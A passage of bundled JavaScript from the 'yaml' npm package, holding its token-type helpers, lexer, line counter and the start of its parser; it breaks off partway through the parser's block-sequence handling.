  var isScalar = (token) => !!token && (token.type === "scalar" || token.type === "single-quoted-scalar" || token.type === "double-quoted-scalar" || token.type === "block-scalar");
  function prettyToken(token) {
    switch (token) {
      case BOM:
        return "<BOM>";
      case DOCUMENT:
        return "<DOC>";
      case FLOW_END:
        return "<FLOW_END>";
      case SCALAR:
        return "<SCALAR>";
      default:
        return JSON.stringify(token);
    }
  }
  function tokenType(source) {
    switch (source) {
      case BOM:
        return "byte-order-mark";
      case DOCUMENT:
        return "doc-mode";
      case FLOW_END:
        return "flow-error-end";
      case SCALAR:
        return "scalar";
      case "---":
        return "doc-start";
      case "...":
        return "doc-end";
      case "":
      case `
`:
      case `\r
`:
        return "newline";
      case "-":
        return "seq-item-ind";
      case "?":
        return "explicit-key-ind";
      case ":":
        return "map-value-ind";
      case "{":
        return "flow-map-start";
      case "}":
        return "flow-map-end";
      case "[":
        return "flow-seq-start";
      case "]":
        return "flow-seq-end";
      case ",":
        return "comma";
    }
    switch (source[0]) {
      case " ":
      case "\t":
        return "space";
      case "#":
        return "comment";
      case "%":
        return "directive-line";
      case "*":
        return "alias";
      case "&":
        return "anchor";
      case "!":
        return "tag";
      case "'":
        return "single-quoted-scalar";
      case '"':
        return "double-quoted-scalar";
      case "|":
      case ">":
        return "block-scalar-header";
    }
    return null;
  }
  exports.createScalarToken = cstScalar.createScalarToken;
  exports.resolveAsScalar = cstScalar.resolveAsScalar;
  exports.setScalarValue = cstScalar.setScalarValue;
  exports.stringify = cstStringify.stringify;
  exports.visit = cstVisit.visit;
  exports.BOM = BOM;
  exports.DOCUMENT = DOCUMENT;
  exports.FLOW_END = FLOW_END;
  exports.SCALAR = SCALAR;
  exports.isCollection = isCollection;
  exports.isScalar = isScalar;
  exports.prettyToken = prettyToken;
  exports.tokenType = tokenType;
});

// node_modules/yaml/dist/parse/lexer.js
var require_lexer = __commonJS((exports) => {
  var cst = require_cst();
  function isEmpty(ch) {
    switch (ch) {
      case undefined:
      case " ":
      case `
`:
      case "\r":
      case "\t":
        return true;
      default:
        return false;
    }
  }
  var hexDigits = new Set("0123456789ABCDEFabcdef");
  var tagChars = new Set("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-#;/?:@&=+$_.!~*'()");
  var flowIndicatorChars = new Set(",[]{}");
  var invalidAnchorChars = new Set(` ,[]{}
\r	`);
  var isNotAnchorChar = (ch) => !ch || invalidAnchorChars.has(ch);

  class Lexer {
    constructor() {
      this.atEnd = false;
      this.blockScalarIndent = -1;
      this.blockScalarKeep = false;
      this.buffer = "";
      this.flowKey = false;
      this.flowLevel = 0;
      this.indentNext = 0;
      this.indentValue = 0;
      this.lineEndPos = null;
      this.next = null;
      this.pos = 0;
    }
    *lex(source, incomplete = false) {
      if (source) {
        if (typeof source !== "string")
          throw TypeError("source is not a string");
        this.buffer = this.buffer ? this.buffer + source : source;
        this.lineEndPos = null;
      }
      this.atEnd = !incomplete;
      let next = this.next ?? "stream";
      while (next && (incomplete || this.hasChars(1)))
        next = yield* this.parseNext(next);
    }
    atLineEnd() {
      let i = this.pos;
      let ch = this.buffer[i];
      while (ch === " " || ch === "\t")
        ch = this.buffer[++i];
      if (!ch || ch === "#" || ch === `
`)
        return true;
      if (ch === "\r")
        return this.buffer[i + 1] === `
`;
      return false;
    }
    charAt(n) {
      return this.buffer[this.pos + n];
    }
    continueScalar(offset) {
      let ch = this.buffer[offset];
      if (this.indentNext > 0) {
        let indent = 0;
        while (ch === " ")
          ch = this.buffer[++indent + offset];
        if (ch === "\r") {
          const next = this.buffer[indent + offset + 1];
          if (next === `
` || !next && !this.atEnd)
            return offset + indent + 1;
        }
        return ch === `
` || indent >= this.indentNext || !ch && !this.atEnd ? offset + indent : -1;
      }
      if (ch === "-" || ch === ".") {
        const dt = this.buffer.substr(offset, 3);
        if ((dt === "---" || dt === "...") && isEmpty(this.buffer[offset + 3]))
          return -1;
      }
      return offset;
    }
    getLine() {
      let end = this.lineEndPos;
      if (typeof end !== "number" || end !== -1 && end < this.pos) {
        end = this.buffer.indexOf(`
`, this.pos);
        this.lineEndPos = end;
      }
      if (end === -1)
        return this.atEnd ? this.buffer.substring(this.pos) : null;
      if (this.buffer[end - 1] === "\r")
        end -= 1;
      return this.buffer.substring(this.pos, end);
    }
    hasChars(n) {
      return this.pos + n <= this.buffer.length;
    }
    setNext(state) {
      this.buffer = this.buffer.substring(this.pos);
      this.pos = 0;
      this.lineEndPos = null;
      this.next = state;
      return null;
    }
    peek(n) {
      return this.buffer.substr(this.pos, n);
    }
    *parseNext(next) {
      switch (next) {
        case "stream":
          return yield* this.parseStream();
        case "line-start":
          return yield* this.parseLineStart();
        case "block-start":
          return yield* this.parseBlockStart();
        case "doc":
          return yield* this.parseDocument();
        case "flow":
          return yield* this.parseFlowCollection();
        case "quoted-scalar":
          return yield* this.parseQuotedScalar();
        case "block-scalar":
          return yield* this.parseBlockScalar();
        case "plain-scalar":
          return yield* this.parsePlainScalar();
      }
    }
    *parseStream() {
      let line = this.getLine();
      if (line === null)
        return this.setNext("stream");
      if (line[0] === cst.BOM) {
        yield* this.pushCount(1);
        line = line.substring(1);
      }
      if (line[0] === "%") {
        let dirEnd = line.length;
        let cs = line.indexOf("#");
        while (cs !== -1) {
          const ch = line[cs - 1];
          if (ch === " " || ch === "\t") {
            dirEnd = cs - 1;
            break;
          } else {
            cs = line.indexOf("#", cs + 1);
          }
        }
        while (true) {
          const ch = line[dirEnd - 1];
          if (ch === " " || ch === "\t")
            dirEnd -= 1;
          else
            break;
        }
        const n = (yield* this.pushCount(dirEnd)) + (yield* this.pushSpaces(true));
        yield* this.pushCount(line.length - n);
        this.pushNewline();
        return "stream";
      }
      if (this.atLineEnd()) {
        const sp = yield* this.pushSpaces(true);
        yield* this.pushCount(line.length - sp);
        yield* this.pushNewline();
        return "stream";
      }
      yield cst.DOCUMENT;
      return yield* this.parseLineStart();
    }
    *parseLineStart() {
      const ch = this.charAt(0);
      if (!ch && !this.atEnd)
        return this.setNext("line-start");
      if (ch === "-" || ch === ".") {
        if (!this.atEnd && !this.hasChars(4))
          return this.setNext("line-start");
        const s = this.peek(3);
        if ((s === "---" || s === "...") && isEmpty(this.charAt(3))) {
          yield* this.pushCount(3);
          this.indentValue = 0;
          this.indentNext = 0;
          return s === "---" ? "doc" : "stream";
        }
      }
      this.indentValue = yield* this.pushSpaces(false);
      if (this.indentNext > this.indentValue && !isEmpty(this.charAt(1)))
        this.indentNext = this.indentValue;
      return yield* this.parseBlockStart();
    }
    *parseBlockStart() {
      const [ch0, ch1] = this.peek(2);
      if (!ch1 && !this.atEnd)
        return this.setNext("block-start");
      if ((ch0 === "-" || ch0 === "?" || ch0 === ":") && isEmpty(ch1)) {
        const n = (yield* this.pushCount(1)) + (yield* this.pushSpaces(true));
        this.indentNext = this.indentValue + 1;
        this.indentValue += n;
        return yield* this.parseBlockStart();
      }
      return "doc";
    }
    *parseDocument() {
      yield* this.pushSpaces(true);
      const line = this.getLine();
      if (line === null)
        return this.setNext("doc");
      let n = yield* this.pushIndicators();
      switch (line[n]) {
        case "#":
          yield* this.pushCount(line.length - n);
        case undefined:
          yield* this.pushNewline();
          return yield* this.parseLineStart();
        case "{":
        case "[":
          yield* this.pushCount(1);
          this.flowKey = false;
          this.flowLevel = 1;
          return "flow";
        case "}":
        case "]":
          yield* this.pushCount(1);
          return "doc";
        case "*":
          yield* this.pushUntil(isNotAnchorChar);
          return "doc";
        case '"':
        case "'":
          return yield* this.parseQuotedScalar();
        case "|":
        case ">":
          n += yield* this.parseBlockScalarHeader();
          n += yield* this.pushSpaces(true);
          yield* this.pushCount(line.length - n);
          yield* this.pushNewline();
          return yield* this.parseBlockScalar();
        default:
          return yield* this.parsePlainScalar();
      }
    }
    *parseFlowCollection() {
      let nl, sp;
      let indent = -1;
      do {
        nl = yield* this.pushNewline();
        if (nl > 0) {
          sp = yield* this.pushSpaces(false);
          this.indentValue = indent = sp;
        } else {
          sp = 0;
        }
        sp += yield* this.pushSpaces(true);
      } while (nl + sp > 0);
      const line = this.getLine();
      if (line === null)
        return this.setNext("flow");
      if (indent !== -1 && indent < this.indentNext && line[0] !== "#" || indent === 0 && (line.startsWith("---") || line.startsWith("...")) && isEmpty(line[3])) {
        const atFlowEndMarker = indent === this.indentNext - 1 && this.flowLevel === 1 && (line[0] === "]" || line[0] === "}");
        if (!atFlowEndMarker) {
          this.flowLevel = 0;
          yield cst.FLOW_END;
          return yield* this.parseLineStart();
        }
      }
      let n = 0;
      while (line[n] === ",") {
        n += yield* this.pushCount(1);
        n += yield* this.pushSpaces(true);
        this.flowKey = false;
      }
      n += yield* this.pushIndicators();
      switch (line[n]) {
        case undefined:
          return "flow";
        case "#":
          yield* this.pushCount(line.length - n);
          return "flow";
        case "{":
        case "[":
          yield* this.pushCount(1);
          this.flowKey = false;
          this.flowLevel += 1;
          return "flow";
        case "}":
        case "]":
          yield* this.pushCount(1);
          this.flowKey = true;
          this.flowLevel -= 1;
          return this.flowLevel ? "flow" : "doc";
        case "*":
          yield* this.pushUntil(isNotAnchorChar);
          return "flow";
        case '"':
        case "'":
          this.flowKey = true;
          return yield* this.parseQuotedScalar();
        case ":": {
          const next = this.charAt(1);
          if (this.flowKey || isEmpty(next) || next === ",") {
            this.flowKey = false;
            yield* this.pushCount(1);
            yield* this.pushSpaces(true);
            return "flow";
          }
        }
        default:
          this.flowKey = false;
          return yield* this.parsePlainScalar();
      }
    }
    *parseQuotedScalar() {
      const quote = this.charAt(0);
      let end = this.buffer.indexOf(quote, this.pos + 1);
      if (quote === "'") {
        while (end !== -1 && this.buffer[end + 1] === "'")
          end = this.buffer.indexOf("'", end + 2);
      } else {
        while (end !== -1) {
          let n = 0;
          while (this.buffer[end - 1 - n] === "\\")
            n += 1;
          if (n % 2 === 0)
            break;
          end = this.buffer.indexOf('"', end + 1);
        }
      }
      const qb = this.buffer.substring(0, end);
      let nl = qb.indexOf(`
`, this.pos);
      if (nl !== -1) {
        while (nl !== -1) {
          const cs = this.continueScalar(nl + 1);
          if (cs === -1)
            break;
          nl = qb.indexOf(`
`, cs);
        }
        if (nl !== -1) {
          end = nl - (qb[nl - 1] === "\r" ? 2 : 1);
        }
      }
      if (end === -1) {
        if (!this.atEnd)
          return this.setNext("quoted-scalar");
        end = this.buffer.length;
      }
      yield* this.pushToIndex(end + 1, false);
      return this.flowLevel ? "flow" : "doc";
    }
    *parseBlockScalarHeader() {
      this.blockScalarIndent = -1;
      this.blockScalarKeep = false;
      let i = this.pos;
      while (true) {
        const ch = this.buffer[++i];
        if (ch === "+")
          this.blockScalarKeep = true;
        else if (ch > "0" && ch <= "9")
          this.blockScalarIndent = Number(ch) - 1;
        else if (ch !== "-")
          break;
      }
      return yield* this.pushUntil((ch) => isEmpty(ch) || ch === "#");
    }
    *parseBlockScalar() {
      let nl = this.pos - 1;
      let indent = 0;
      let ch;
      loop:
        for (let i2 = this.pos;ch = this.buffer[i2]; ++i2) {
          switch (ch) {
            case " ":
              indent += 1;
              break;
            case `
`:
              nl = i2;
              indent = 0;
              break;
            case "\r": {
              const next = this.buffer[i2 + 1];
              if (!next && !this.atEnd)
                return this.setNext("block-scalar");
              if (next === `
`)
                break;
            }
            default:
              break loop;
          }
        }
      if (!ch && !this.atEnd)
        return this.setNext("block-scalar");
      if (indent >= this.indentNext) {
        if (this.blockScalarIndent === -1)
          this.indentNext = indent;
        else {
          this.indentNext = this.blockScalarIndent + (this.indentNext === 0 ? 1 : this.indentNext);
        }
        do {
          const cs = this.continueScalar(nl + 1);
          if (cs === -1)
            break;
          nl = this.buffer.indexOf(`
`, cs);
        } while (nl !== -1);
        if (nl === -1) {
          if (!this.atEnd)
            return this.setNext("block-scalar");
          nl = this.buffer.length;
        }
      }
      let i = nl + 1;
      ch = this.buffer[i];
      while (ch === " ")
        ch = this.buffer[++i];
      if (ch === "\t") {
        while (ch === "\t" || ch === " " || ch === "\r" || ch === `
`)
          ch = this.buffer[++i];
        nl = i - 1;
      } else if (!this.blockScalarKeep) {
        do {
          let i2 = nl - 1;
          let ch2 = this.buffer[i2];
          if (ch2 === "\r")
            ch2 = this.buffer[--i2];
          const lastChar = i2;
          while (ch2 === " ")
            ch2 = this.buffer[--i2];
          if (ch2 === `
` && i2 >= this.pos && i2 + 1 + indent > lastChar)
            nl = i2;
          else
            break;
        } while (true);
      }
      yield cst.SCALAR;
      yield* this.pushToIndex(nl + 1, true);
      return yield* this.parseLineStart();
    }
    *parsePlainScalar() {
      const inFlow = this.flowLevel > 0;
      let end = this.pos - 1;
      let i = this.pos - 1;
      let ch;
      while (ch = this.buffer[++i]) {
        if (ch === ":") {
          const next = this.buffer[i + 1];
          if (isEmpty(next) || inFlow && flowIndicatorChars.has(next))
            break;
          end = i;
        } else if (isEmpty(ch)) {
          let next = this.buffer[i + 1];
          if (ch === "\r") {
            if (next === `
`) {
              i += 1;
              ch = `
`;
              next = this.buffer[i + 1];
            } else
              end = i;
          }
          if (next === "#" || inFlow && flowIndicatorChars.has(next))
            break;
          if (ch === `
`) {
            const cs = this.continueScalar(i + 1);
            if (cs === -1)
              break;
            i = Math.max(i, cs - 2);
          }
        } else {
          if (inFlow && flowIndicatorChars.has(ch))
            break;
          end = i;
        }
      }
      if (!ch && !this.atEnd)
        return this.setNext("plain-scalar");
      yield cst.SCALAR;
      yield* this.pushToIndex(end + 1, true);
      return inFlow ? "flow" : "doc";
    }
    *pushCount(n) {
      if (n > 0) {
        yield this.buffer.substr(this.pos, n);
        this.pos += n;
        return n;
      }
      return 0;
    }
    *pushToIndex(i, allowEmpty) {
      const s = this.buffer.slice(this.pos, i);
      if (s) {
        yield s;
        this.pos += s.length;
        return s.length;
      } else if (allowEmpty)
        yield "";
      return 0;
    }
    *pushIndicators() {
      switch (this.charAt(0)) {
        case "!":
          return (yield* this.pushTag()) + (yield* this.pushSpaces(true)) + (yield* this.pushIndicators());
        case "&":
          return (yield* this.pushUntil(isNotAnchorChar)) + (yield* this.pushSpaces(true)) + (yield* this.pushIndicators());
        case "-":
        case "?":
        case ":": {
          const inFlow = this.flowLevel > 0;
          const ch1 = this.charAt(1);
          if (isEmpty(ch1) || inFlow && flowIndicatorChars.has(ch1)) {
            if (!inFlow)
              this.indentNext = this.indentValue + 1;
            else if (this.flowKey)
              this.flowKey = false;
            return (yield* this.pushCount(1)) + (yield* this.pushSpaces(true)) + (yield* this.pushIndicators());
          }
        }
      }
      return 0;
    }
    *pushTag() {
      if (this.charAt(1) === "<") {
        let i = this.pos + 2;
        let ch = this.buffer[i];
        while (!isEmpty(ch) && ch !== ">")
          ch = this.buffer[++i];
        return yield* this.pushToIndex(ch === ">" ? i + 1 : i, false);
      } else {
        let i = this.pos + 1;
        let ch = this.buffer[i];
        while (ch) {
          if (tagChars.has(ch))
            ch = this.buffer[++i];
          else if (ch === "%" && hexDigits.has(this.buffer[i + 1]) && hexDigits.has(this.buffer[i + 2])) {
            ch = this.buffer[i += 3];
          } else
            break;
        }
        return yield* this.pushToIndex(i, false);
      }
    }
    *pushNewline() {
      const ch = this.buffer[this.pos];
      if (ch === `
`)
        return yield* this.pushCount(1);
      else if (ch === "\r" && this.charAt(1) === `
`)
        return yield* this.pushCount(2);
      else
        return 0;
    }
    *pushSpaces(allowTabs) {
      let i = this.pos - 1;
      let ch;
      do {
        ch = this.buffer[++i];
      } while (ch === " " || allowTabs && ch === "\t");
      const n = i - this.pos;
      if (n > 0) {
        yield this.buffer.substr(this.pos, n);
        this.pos = i;
      }
      return n;
    }
    *pushUntil(test) {
      let i = this.pos;
      let ch = this.buffer[i];
      while (!test(ch))
        ch = this.buffer[++i];
      return yield* this.pushToIndex(i, false);
    }
  }
  exports.Lexer = Lexer;
});

// node_modules/yaml/dist/parse/line-counter.js
var require_line_counter = __commonJS((exports) => {
  class LineCounter {
    constructor() {
      this.lineStarts = [];
      this.addNewLine = (offset) => this.lineStarts.push(offset);
      this.linePos = (offset) => {
        let low = 0;
        let high = this.lineStarts.length;
        while (low < high) {
          const mid = low + high >> 1;
          if (this.lineStarts[mid] < offset)
            low = mid + 1;
          else
            high = mid;
        }
        if (this.lineStarts[low] === offset)
          return { line: low + 1, col: 1 };
        if (low === 0)
          return { line: 0, col: offset };
        const start = this.lineStarts[low - 1];
        return { line: low, col: offset - start + 1 };
      };
    }
  }
  exports.LineCounter = LineCounter;
});

// node_modules/yaml/dist/parse/parser.js
var require_parser = __commonJS((exports) => {
  var node_process = __require("process");
  var cst = require_cst();
  var lexer = require_lexer();
  function includesToken(list, type) {
    for (let i = 0;i < list.length; ++i)
      if (list[i].type === type)
        return true;
    return false;
  }
  function findNonEmptyIndex(list) {
    for (let i = 0;i < list.length; ++i) {
      switch (list[i].type) {
        case "space":
        case "comment":
        case "newline":
          break;
        default:
          return i;
      }
    }
    return -1;
  }
  function isFlowToken(token) {
    switch (token?.type) {
      case "alias":
      case "scalar":
      case "single-quoted-scalar":
      case "double-quoted-scalar":
      case "flow-collection":
        return true;
      default:
        return false;
    }
  }
  function getPrevProps(parent) {
    switch (parent.type) {
      case "document":
        return parent.start;
      case "block-map": {
        const it = parent.items[parent.items.length - 1];
        return it.sep ?? it.start;
      }
      case "block-seq":
        return parent.items[parent.items.length - 1].start;
      default:
        return [];
    }
  }
  function getFirstKeyStartProps(prev) {
    if (prev.length === 0)
      return [];
    let i = prev.length;
    loop:
      while (--i >= 0) {
        switch (prev[i].type) {
          case "doc-start":
          case "explicit-key-ind":
          case "map-value-ind":
          case "seq-item-ind":
          case "newline":
            break loop;
        }
      }
    while (prev[++i]?.type === "space") {}
    return prev.splice(i, prev.length);
  }
  function fixFlowSeqItems(fc) {
    if (fc.start.type === "flow-seq-start") {
      for (const it of fc.items) {
        if (it.sep && !it.value && !includesToken(it.start, "explicit-key-ind") && !includesToken(it.sep, "map-value-ind")) {
          if (it.key)
            it.value = it.key;
          delete it.key;
          if (isFlowToken(it.value)) {
            if (it.value.end)
              Array.prototype.push.apply(it.value.end, it.sep);
            else
              it.value.end = it.sep;
          } else
            Array.prototype.push.apply(it.start, it.sep);
          delete it.sep;
        }
      }
    }
  }

  class Parser {
    constructor(onNewLine) {
      this.atNewLine = true;
      this.atScalar = false;
      this.indent = 0;
      this.offset = 0;
      this.onKeyLine = false;
      this.stack = [];
      this.source = "";
      this.type = "";
      this.lexer = new lexer.Lexer;
      this.onNewLine = onNewLine;
    }
    *parse(source, incomplete = false) {
      if (this.onNewLine && this.offset === 0)
        this.onNewLine(0);
      for (const lexeme of this.lexer.lex(source, incomplete))
        yield* this.next(lexeme);
      if (!incomplete)
        yield* this.end();
    }
    *next(source) {
      this.source = source;
      if (node_process.env.LOG_TOKENS)
        console.log("|", cst.prettyToken(source));
      if (this.atScalar) {
        this.atScalar = false;
        yield* this.step();
        this.offset += source.length;
        return;
      }
      const type = cst.tokenType(source);
      if (!type) {
        const message = `Not a YAML token: ${source}`;
        yield* this.pop({ type: "error", offset: this.offset, message, source });
        this.offset += source.length;
      } else if (type === "scalar") {
        this.atNewLine = false;
        this.atScalar = true;
        this.type = "scalar";
      } else {
        this.type = type;
        yield* this.step();
        switch (type) {
          case "newline":
            this.atNewLine = true;
            this.indent = 0;
            if (this.onNewLine)
              this.onNewLine(this.offset + source.length);
            break;
          case "space":
            if (this.atNewLine && source[0] === " ")
              this.indent += source.length;
            break;
          case "explicit-key-ind":
          case "map-value-ind":
          case "seq-item-ind":
            if (this.atNewLine)
              this.indent += source.length;
            break;
          case "doc-mode":
          case "flow-error-end":
            return;
          default:
            this.atNewLine = false;
        }
        this.offset += source.length;
      }
    }
    *end() {
      while (this.stack.length > 0)
        yield* this.pop();
    }
    get sourceToken() {
      const st = {
        type: this.type,
        offset: this.offset,
        indent: this.indent,
        source: this.source
      };
      return st;
    }
    *step() {
      const top = this.peek(1);
      if (this.type === "doc-end" && top?.type !== "doc-end") {
        while (this.stack.length > 0)
          yield* this.pop();
        this.stack.push({
          type: "doc-end",
          offset: this.offset,
          source: this.source
        });
        return;
      }
      if (!top)
        return yield* this.stream();
      switch (top.type) {
        case "document":
          return yield* this.document(top);
        case "alias":
        case "scalar":
        case "single-quoted-scalar":
        case "double-quoted-scalar":
          return yield* this.scalar(top);
        case "block-scalar":
          return yield* this.blockScalar(top);
        case "block-map":
          return yield* this.blockMap(top);
        case "block-seq":
          return yield* this.blockSequence(top);
        case "flow-collection":
          return yield* this.flowCollection(top);
        case "doc-end":
          return yield* this.documentEnd(top);
      }
      yield* this.pop();
    }
    peek(n) {
      return this.stack[this.stack.length - n];
    }
    *pop(error48) {
      const token = error48 ?? this.stack.pop();
      if (!token) {
        const message = "Tried to pop an empty stack";
        yield { type: "error", offset: this.offset, source: "", message };
      } else if (this.stack.length === 0) {
        yield token;
      } else {
        const top = this.peek(1);
        if (token.type === "block-scalar") {
          token.indent = "indent" in top ? top.indent : 0;
        } else if (token.type === "flow-collection" && top.type === "document") {
          token.indent = 0;
        }
        if (token.type === "flow-collection")
          fixFlowSeqItems(token);
        switch (top.type) {
          case "document":
            top.value = token;
            break;
          case "block-scalar":
            top.props.push(token);
            break;
          case "block-map": {
            const it = top.items[top.items.length - 1];
            if (it.value) {
              top.items.push({ start: [], key: token, sep: [] });
              this.onKeyLine = true;
              return;
            } else if (it.sep) {
              it.value = token;
            } else {
              Object.assign(it, { key: token, sep: [] });
              this.onKeyLine = !it.explicitKey;
              return;
            }
            break;
          }
          case "block-seq": {
            const it = top.items[top.items.length - 1];
            if (it.value)
              top.items.push({ start: [], value: token });
            else
              it.value = token;
            break;
          }
          case "flow-collection": {
            const it = top.items[top.items.length - 1];
            if (!it || it.value)
              top.items.push({ start: [], key: token, sep: [] });
            else if (it.sep)
              it.value = token;
            else
              Object.assign(it, { key: token, sep: [] });
            return;
          }
          default:
            yield* this.pop();
            yield* this.pop(token);
        }
        if ((top.type === "document" || top.type === "block-map" || top.type === "block-seq") && (token.type === "block-map" || token.type === "block-seq")) {
          const last = token.items[token.items.length - 1];
          if (last && !last.sep && !last.value && last.start.length > 0 && findNonEmptyIndex(last.start) === -1 && (token.indent === 0 || last.start.every((st) => st.type !== "comment" || st.indent < token.indent))) {
            if (top.type === "document")
              top.end = last.start;
            else
              top.items.push({ start: last.start });
            token.items.splice(-1, 1);
          }
        }
      }
    }
    *stream() {
      switch (this.type) {
        case "directive-line":
          yield { type: "directive", offset: this.offset, source: this.source };
          return;
        case "byte-order-mark":
        case "space":
        case "comment":
        case "newline":
          yield this.sourceToken;
          return;
        case "doc-mode":
        case "doc-start": {
          const doc2 = {
            type: "document",
            offset: this.offset,
            start: []
          };
          if (this.type === "doc-start")
            doc2.start.push(this.sourceToken);
          this.stack.push(doc2);
          return;
        }
      }
      yield {
        type: "error",
        offset: this.offset,
        message: `Unexpected ${this.type} token in YAML stream`,
        source: this.source
      };
    }
    *document(doc2) {
      if (doc2.value)
        return yield* this.lineEnd(doc2);
      switch (this.type) {
        case "doc-start": {
          if (findNonEmptyIndex(doc2.start) !== -1) {
            yield* this.pop();
            yield* this.step();
          } else
            doc2.start.push(this.sourceToken);
          return;
        }
        case "anchor":
        case "tag":
        case "space":
        case "comment":
        case "newline":
          doc2.start.push(this.sourceToken);
          return;
      }
      const bv = this.startBlockValue(doc2);
      if (bv)
        this.stack.push(bv);
      else {
        yield {
          type: "error",
          offset: this.offset,
          message: `Unexpected ${this.type} token in YAML document`,
          source: this.source
        };
      }
    }
    *scalar(scalar) {
      if (this.type === "map-value-ind") {
        const prev = getPrevProps(this.peek(2));
        const start = getFirstKeyStartProps(prev);
        let sep;
        if (scalar.end) {
          sep = scalar.end;
          sep.push(this.sourceToken);
          delete scalar.end;
        } else
          sep = [this.sourceToken];
        const map2 = {
          type: "block-map",
          offset: scalar.offset,
          indent: scalar.indent,
          items: [{ start, key: scalar, sep }]
        };
        this.onKeyLine = true;
        this.stack[this.stack.length - 1] = map2;
      } else
        yield* this.lineEnd(scalar);
    }
    *blockScalar(scalar) {
      switch (this.type) {
        case "space":
        case "comment":
        case "newline":
          scalar.props.push(this.sourceToken);
          return;
        case "scalar":
          scalar.source = this.source;
          this.atNewLine = true;
          this.indent = 0;
          if (this.onNewLine) {
            let nl = this.source.indexOf(`
`) + 1;
            while (nl !== 0) {
              this.onNewLine(this.offset + nl);
              nl = this.source.indexOf(`
`, nl) + 1;
            }
          }
          yield* this.pop();
          break;
        default:
          yield* this.pop();
          yield* this.step();
      }
    }
    *blockMap(map2) {
      const it = map2.items[map2.items.length - 1];
      switch (this.type) {
        case "newline":
          this.onKeyLine = false;
          if (it.value) {
            const end = "end" in it.value ? it.value.end : undefined;
            const last = Array.isArray(end) ? end[end.length - 1] : undefined;
            if (last?.type === "comment")
              end?.push(this.sourceToken);
            else
              map2.items.push({ start: [this.sourceToken] });
          } else if (it.sep) {
            it.sep.push(this.sourceToken);
          } else {
            it.start.push(this.sourceToken);
          }
          return;
        case "space":
        case "comment":
          if (it.value) {
            map2.items.push({ start: [this.sourceToken] });
          } else if (it.sep) {
            it.sep.push(this.sourceToken);
          } else {
            if (this.atIndentedComment(it.start, map2.indent)) {
              const prev = map2.items[map2.items.length - 2];
              const end = prev?.value?.end;
              if (Array.isArray(end)) {
                Array.prototype.push.apply(end, it.start);
                end.push(this.sourceToken);
                map2.items.pop();
                return;
              }
            }
            it.start.push(this.sourceToken);
          }
          return;
      }
      if (this.indent >= map2.indent) {
        const atMapIndent = !this.onKeyLine && this.indent === map2.indent;
        const atNextItem = atMapIndent && (it.sep || it.explicitKey) && this.type !== "seq-item-ind";
        let start = [];
        if (atNextItem && it.sep && !it.value) {
          const nl = [];
          for (let i = 0;i < it.sep.length; ++i) {
            const st = it.sep[i];
            switch (st.type) {
              case "newline":
                nl.push(i);
                break;
              case "space":
                break;
              case "comment":
                if (st.indent > map2.indent)
                  nl.length = 0;
                break;
              default:
                nl.length = 0;
            }
          }
          if (nl.length >= 2)
            start = it.sep.splice(nl[1]);
        }
        switch (this.type) {
          case "anchor":
          case "tag":
            if (atNextItem || it.value) {
              start.push(this.sourceToken);
              map2.items.push({ start });
              this.onKeyLine = true;
            } else if (it.sep) {
              it.sep.push(this.sourceToken);
            } else {
              it.start.push(this.sourceToken);
            }
            return;
          case "explicit-key-ind":
            if (!it.sep && !it.explicitKey) {
              it.start.push(this.sourceToken);
              it.explicitKey = true;
            } else if (atNextItem || it.value) {
              start.push(this.sourceToken);
              map2.items.push({ start, explicitKey: true });
            } else {
              this.stack.push({
                type: "block-map",
                offset: this.offset,
                indent: this.indent,
                items: [{ start: [this.sourceToken], explicitKey: true }]
              });
            }
            this.onKeyLine = true;
            return;
          case "map-value-ind":
            if (it.explicitKey) {
              if (!it.sep) {
                if (includesToken(it.start, "newline")) {
                  Object.assign(it, { key: null, sep: [this.sourceToken] });
                } else {
                  const start2 = getFirstKeyStartProps(it.start);
                  this.stack.push({
                    type: "block-map",
                    offset: this.offset,
                    indent: this.indent,
                    items: [{ start: start2, key: null, sep: [this.sourceToken] }]
                  });
                }
              } else if (it.value) {
                map2.items.push({ start: [], key: null, sep: [this.sourceToken] });
              } else if (includesToken(it.sep, "map-value-ind")) {
                this.stack.push({
                  type: "block-map",
                  offset: this.offset,
                  indent: this.indent,
                  items: [{ start, key: null, sep: [this.sourceToken] }]
                });
              } else if (isFlowToken(it.key) && !includesToken(it.sep, "newline")) {
                const start2 = getFirstKeyStartProps(it.start);
                const key = it.key;
                const sep = it.sep;
                sep.push(this.sourceToken);
                delete it.key;
                delete it.sep;
                this.stack.push({
                  type: "block-map",
                  offset: this.offset,
                  indent: this.indent,
                  items: [{ start: start2, key, sep }]
                });
              } else if (start.length > 0) {
                it.sep = it.sep.concat(start, this.sourceToken);
              } else {
                it.sep.push(this.sourceToken);
              }
            } else {
              if (!it.sep) {
                Object.assign(it, { key: null, sep: [this.sourceToken] });
              } else if (it.value || atNextItem) {
                map2.items.push({ start, key: null, sep: [this.sourceToken] });
              } else if (includesToken(it.sep, "map-value-ind")) {
                this.stack.push({
                  type: "block-map",
                  offset: this.offset,
                  indent: this.indent,
                  items: [{ start: [], key: null, sep: [this.sourceToken] }]
                });
              } else {
                it.sep.push(this.sourceToken);
              }
            }
            this.onKeyLine = true;
            return;
          case "alias":
          case "scalar":
          case "single-quoted-scalar":
          case "double-quoted-scalar": {
            const fs = this.flowScalar(this.type);
            if (atNextItem || it.value) {
              map2.items.push({ start, key: fs, sep: [] });
              this.onKeyLine = true;
            } else if (it.sep) {
              this.stack.push(fs);
            } else {
              Object.assign(it, { key: fs, sep: [] });
              this.onKeyLine = true;
            }
            return;
          }
          default: {
            const bv = this.startBlockValue(map2);
            if (bv) {
              if (bv.type === "block-seq") {
                if (!it.explicitKey && it.sep && !includesToken(it.sep, "newline")) {
                  yield* this.pop({
                    type: "error",
                    offset: this.offset,
                    message: "Unexpected block-seq-ind on same line with key",
                    source: this.source
                  });
                  return;
                }
              } else if (atMapIndent) {
                map2.items.push({ start });
              }
              this.stack.push(bv);
              return;
            }
          }
        }
      }
      yield* this.pop();
      yield* this.step();
    }
    *blockSequence(seq) {
      const it = seq.items[seq.items.length - 1];
      switch (this.type) {
        case "newline":
          if (it.value) {
            const end = "end" in it.value ? it.value.end : undefined;
            const last = Array.isArray(end) ? end[end.length - 1] : undefined;
            if (last?.type === "comment")
              end?.push(this.sourceToken);
            else
              seq.items.push({ start: [this.sourceToken] });
          } else
            it.start.push(this.sourceToken);
          return;
        case "space":
        case "comment":
          if (it.value)
            seq.items.push({ start: [this.sourceToken] });
          else {
            if (this.atIndentedComment(it.start, seq.indent)) {
              const prev = seq.items[seq.items.length - 2];
              const end = prev?.value?.end;
              if (Array.isArray(end)) {
